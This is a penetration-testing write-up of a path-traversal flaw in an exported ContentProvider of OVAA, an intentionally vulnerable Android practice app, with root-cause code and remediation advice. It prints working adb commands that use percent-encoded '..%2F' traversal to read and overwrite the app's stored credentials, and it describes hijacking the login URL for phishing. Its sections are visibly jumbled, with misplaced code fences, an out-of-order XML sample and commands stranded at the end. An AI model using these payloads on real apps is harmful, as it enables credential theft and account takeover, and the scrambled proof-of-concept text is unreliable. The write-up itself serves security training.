# TheftOverwriteProvider — Arbitrary File Read/Write via Path Traversal (OVAA)

## Summary
`TheftOverwriteProvider`, an exported `ContentProvider` in the OVAA (Oversecured Vulnerable
Android App) practice target, builds a `File` object directly from `Uri.getLastPathSegment()`
with no path sanitization or canonicalization. Because the base directory is
`Environment.getExternalStorageDirectory()` rather than app-private storage, and the file is
opened in `MODE_READ_WRITE`, a malicious or local attacker can read and write arbitrary files
on the device as the app's own UID — including other apps' private storage paths under
`/data/data/<package>/`.

This was chained to leak and overwrite `oversecured.ovaa`'s own `login_data.xml`
`SharedPreferences` file, resulting in cleartext credential disclosure and a persistent
phishing primitive via tampering with the stored `login_url`.

## Component
```xml
<provider
    android:name=".providers.TheftOverwriteProvider"
    android:authorities="oversecured.ovaa.theftoverwrite"
    android:exported="true" />
```

## Root Cause
```java
@Override
public ParcelFileDescriptor openFile(@NonNull Uri uri, @NonNull String mode) throws FileNotFoundException {
    File file = new File(Environment.getExternalStorageDirectory(), uri.getLastPathSegment());
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_WRITE);
}
```
Two compounding issues:
1. **No path validation** — `uri.getLastPathSegment()` is passed straight into `File()` with
   no check against `..` sequences or canonical-path confinement.
2. **URI-parsing bypass** — naive `../` payloads in the raw path fail because `Uri` splits on
   unencoded `/`, so `getLastPathSegment()` only returns the final segment. Percent-encoding
   the slashes (`%2F`) keeps the full traversal string intact as a single segment; it is
   URL-decoded only after extraction, restoring the `../../../` sequence before it reaches
   `File()`.

## Proof of Concept

**Read:**
```bash
adb shell content read --uri "content://oversecured.ovaa.theftoverwrite/..%2F..%2F..%2Fdata%2Fdata%2Foversecured.ovaa%2Fshared_prefs%2Flogin_data.xml"
```
```xml
    <string name="password">...</string>
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="login_url">https://...</string>
    <string name="email">...</string>
</map>
```
adb shell content write --uri "content://oversecured.ovaa.theftoverwrite/..%2F..%2F..%2Fdata%2Fdata%2Foversecured.ovaa%2Fshared_prefs%2Flogin_data.xml" < payload.xml
```
```
confirming attacker-supplied `login_url`, `email`, and `password` values were written in place.

**Note:** the write does not truncate the target file — `MODE_READ_WRITE` writes from offset 0
without clearing trailing bytes beyond the new payload's length, so a payload shorter than the
original file leaves a malformed tail. Pad the payload or truncate the target first for a clean PoC.

## Impact
- **Confidentiality**: arbitrary read of any world/app-accessible file, including another
  app's `shared_prefs`, `databases/`, and `files/` directories where reachable, plus this
  app's own cleartext-stored credentials (`CWE-312` — no `EncryptedSharedPreferences`).
- **Integrity**: arbitrary write as the app's UID, demonstrated by overwriting `login_url` to
  redirect the app's own login flow to an attacker-controlled endpoint — a persistent
  credential-phishing primitive requiring no further user interaction beyond a normal login.
- Combined, this is a full account-takeover chain (`CWE-22`, `CWE-668`).

## Severity
High — unauthenticated, no user interaction required beyond having the target app installed;
arbitrary file read/write as the vulnerable app's UID.

## Remediation
- Do not derive filesystem paths directly from untrusted URI input.
- If a provider must expose file access, resolve the requested path and verify it with
  `file.getCanonicalPath().startsWith(allowedBaseDir.getCanonicalPath())` before opening.
- Prefer `exported="false"` plus `FileProvider` with a restricted `provider_paths.xml` for any
  legitimate file-sharing need, rather than a custom provider operating on raw segments.
- Store credentials via `EncryptedSharedPreferences` rather than plain `SharedPreferences`.

## Timeline / Context
Practice finding against the intentionally vulnerable OVAA application
(https://github.com/oversecured/ovaa), used for Android pentesting skill-building. Not a
live/responsible-disclosure submission — OVAA is designed to contain this bug.Verified via:
```bash
adb shell run-as oversecured.ovaa cat /data/data/oversecured.ovaa/shared_prefs/login_data.xml

**Write:**
```bash

